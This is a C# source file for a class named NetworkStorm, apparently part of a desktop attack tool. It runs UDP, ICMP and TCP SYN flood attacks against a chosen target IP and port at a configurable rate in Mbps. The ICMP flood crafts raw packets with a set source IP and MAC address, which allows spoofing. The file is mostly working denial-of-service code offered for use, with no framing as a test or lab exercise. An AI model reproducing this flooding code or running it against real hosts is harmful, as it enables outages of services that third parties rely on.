using System;
using System.Collections.Generic;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Controls;
using NLog;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;

namespace Dorothy.Models
{
    public class NetworkStorm
    {
        private string _sourceIp = "192.168.0.1"; // Default Source IP
        private byte[] _sourceMac = new byte[] { 0x00, 0x0C, 0x29, 0x3E, 0x1C, 0x2B }; // Default MAC
        private bool _isAttackRunning = false;
        private readonly TextBox _logArea;
        private CancellationTokenSource _cancellationSource;

        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();

        public bool IsAttackRunning => _isAttackRunning;

        public NetworkStorm(TextBox logArea)
        {
            _logArea = logArea ?? throw new ArgumentNullException(nameof(logArea));
        }

        public async Task StartAttackAsync(string attackType, string targetIp, int targetPort, long megabitsPerSecond)
        {
            if (_isAttackRunning)
            {
                Log("Attack already in progress.");
                return;
            }

            _isAttackRunning = true;
            _cancellationSource = new CancellationTokenSource();

            try
            {
                switch (attackType.ToLower())
                {
                    case "udp":
                        await StartUdpFloodAsync(targetIp, targetPort, megabitsPerSecond, _cancellationSource.Token);
                        break;
                    case "icmp":
                        await StartIcmpFloodAsync(targetIp, megabitsPerSecond, _cancellationSource.Token);
                        break;
                    case "tcp":
                        await StartTcpSynFloodAsync(targetIp, targetPort, megabitsPerSecond, _cancellationSource.Token);
                        break;
                    default:
                        Log($"Unknown attack type: {attackType}");
                        break;
                }
            }
            finally
            {
                _isAttackRunning = false;
            }
        }

        public async Task StopAttackAsync()
        {
            if (!_isAttackRunning)
            {
                Log("No attack is running.");
                return;
            }

            _cancellationSource.Cancel();

            // Allow some time for the attack to stop gracefully
            await Task.Delay(500);
            Log("Attack termination requested.");
        }

        private void Log(string message)
        {
            try
            {
                var timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                var logMessage = $"[{timestamp}] {message}\n";

                // Ensure thread-safe access to the UI thread
                if (_logArea.Dispatcher.CheckAccess())
                {
                    _logArea.AppendText(logMessage);
                    _logArea.ScrollToEnd();
                }
                else
                {
                    _logArea.Dispatcher.Invoke(() =>
                    {
                        _logArea.AppendText(logMessage);
                        _logArea.ScrollToEnd();
                    });
                }

                Logger.Debug(message);
            }
            catch (Exception ex)
            {
                // Fallback logging in case of failure
                Logger.Error(ex, "Logging failed.");
            }
        }

        private async Task StartIcmpFloodAsync(string targetIp, long megabitsPerSecond, CancellationToken token)
        {
            Log("Starting ICMP Flood attack...");
            try
            {
                // Approximate bytes per ping (payload + headers)
                long bytesPerPing = 64; // Typical ICMP Echo Request size
                long bitsPerPing = bytesPerPing * 8;
                long totalBitsPerSecond = megabitsPerSecond * 1_000_000;
                int pingsPerSecond = (int)(totalBitsPerSecond / bitsPerPing);

                // Cap the pings per second to a reasonable number to prevent system overload
                pingsPerSecond = Math.Min(pingsPerSecond, 100_000); // Example cap at 100,000 pings/sec
                if (pingsPerSecond <= 0) pingsPerSecond = 1;

                Log($"ICMP Flood: Sending {pingsPerSecond} pings per second ({megabitsPerSecond} Mbps).");

                int successfulPings = 0;
                var lastLogTime = DateTime.Now;

                // Initialize SharpPcap device
                var devices = CaptureDeviceList.Instance;
                if (devices.Count < 1)
                {
                    Log("No capture devices found.");
                    return;
                }

                // Select the first device (modify as needed)
                var device = devices[0];
                device.Open();

                // Resolve MAC addresses
                var targetIpAddress = IPAddress.Parse(targetIp);
                var sourceIpAddress = IPAddress.Parse(_sourceIp);

                PhysicalAddress targetMac;

                // ARP resolution can be implemented here or statically set
                // For simplicity, using a placeholder MAC address
                targetMac = new PhysicalAddress(new byte[] { 0x00, 0x0C, 0x29, 0x3E, 0x1C, 0x2B });

                while (!token.IsCancellationRequested)
                {
                    var icmpPackets = new List<Packet>();

                    for (int i = 0; i < pingsPerSecond; i++)
                    {
                        // Build Ethernet Layer
                        var ethernet = new EthernetPacket(new PhysicalAddress(_sourceMac), targetMac, EthernetType.IPv4);

                        // Build IP Layer
                        var ip = new IPv4Packet(sourceIpAddress, targetIpAddress)
                        {
                            Protocol = PacketDotNet.ProtocolType.Icmp,
                            TimeToLive = 128
                        };
                        // Build ICMP Layer
                        var icmp = new IcmpV4EchoRequestPacket(IPAddress.HostToNetworkOrder((short)42))
                        {
                            Identifier = 1,
                            SequenceNumber = (short)i
                        };
                        icmp.Bytes = Encoding.ASCII.GetBytes(new string('A', 56)); // 56 bytes payload

                        // Combine layers
                        ip.PayloadPacket = icmp;
                        ethernet.PayloadPacket = ip;

                        icmpPackets.Add(ethernet);
                    }

                    // Send all ICMP packets
                    foreach (var pkt in icmpPackets)
                    {
                        device.SendPacket(pkt);
                        successfulPings++;
                    }

                    // Log every second
                    var currentTime = DateTime.Now;
                    if ((currentTime - lastLogTime).TotalSeconds >= 1)
                    {
                        Log($"ICMP Flood: Sent {successfulPings} pings in the last second.");
                        successfulPings = 0;
                        lastLogTime = currentTime;
                    }

                    // Wait for 1 second before sending the next batch
                    await Task.Delay(1000, token);
                }

                device.Close();
            }
            catch (OperationCanceledException)
            {
                Log("ICMP Flood attack canceled.");
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "Error during ICMP Flood");
                Log($"ICMP Flood attack error: {ex.Message}");
            }
            finally
            {
                Log("ICMP Flood attack stopped.");
            }
        }

        private async Task StartTcpSynFloodAsync(string targetIp, int targetPort, long megabitsPerSecond, CancellationToken token)
        {
            Log("Starting TCP SYN Flood attack...");
            try
            {
                using (TcpFlood tcpFlood = new TcpFlood(targetIp, targetPort, megabitsPerSecond, token, logAction: Log))
                {
                    await tcpFlood.StartAsync();
                }
            }
            catch (OperationCanceledException)
            {
                Log("TCP SYN Flood attack canceled.");
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "Error during TCP SYN Flood");
                Log($"TCP SYN Flood attack error: {ex.Message}");
            }
            finally
            {
                Log("TCP SYN Flood attack stopped.");
            }
        }

        private async Task StartUdpFloodAsync(string targetIp, int targetPort, long megabitsPerSecond, CancellationToken token)
        {
            Log("Starting UDP Flood attack...");
            using (UdpClient udpClient = new UdpClient())
            {
                try
                {
                    udpClient.Connect(targetIp, targetPort);
                    byte[] data = Encoding.ASCII.GetBytes(new string('A', 1024)); // 1 KB payload

                    // Convert Mbps to Bytes per Second
                    long bytesPerSecond = megabitsPerSecond * 125_000; // 1 Mbps = 125,000 Bytes
                    int packetsPerSecond = (int)(bytesPerSecond / data.Length);
                    if (packetsPerSecond <= 0) packetsPerSecond = 1;

                    Log($"UDP Flood: Sending {packetsPerSecond} packets per second ({megabitsPerSecond} Mbps).");

                    while (!token.IsCancellationRequested)
                    {
                        var sendTasks = new List<Task>();

                        for (int i = 0; i < packetsPerSecond; i++)
                        {
                            sendTasks.Add(udpClient.SendAsync(data, data.Length));
                        }

                        await Task.WhenAll(sendTasks);
                        Log($"UDP Flood: Sent {packetsPerSecond} packets in the last second.");

                        // Wait for 1 second before sending the next batch
                        await Task.Delay(1000, token);
                    }
                }
                catch (OperationCanceledException)
                {
                    Log("UDP Flood attack canceled.");
                }
                catch (Exception ex)
                {
                    Logger.Error(ex, "Error during UDP Flood attack.");
                    Log($"UDP Flood attack error: {ex.Message}");
                }
                finally
                {
                    udpClient.Close();
                    Log("UDP Flood attack stopped.");
                }
            }
        }
    }
}
